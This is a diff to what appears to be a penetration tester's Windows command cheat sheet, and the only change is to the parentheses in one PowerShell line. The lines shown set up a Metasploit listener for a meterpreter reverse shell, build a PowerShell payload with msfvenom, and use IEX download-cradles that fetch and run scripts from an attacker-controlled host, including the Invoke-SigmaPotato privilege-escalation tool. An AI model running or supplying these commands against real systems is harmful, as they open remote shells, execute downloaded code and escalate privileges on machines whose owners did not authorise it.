@@ -877,7 +877,7 @@ wmic os get osarchitecture
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
-powershell -c "IEX ((New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1'));Invoke-SigmaPotato -Command \"whoami /user /priv\""
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
 
 +---------- Listeners ----------+
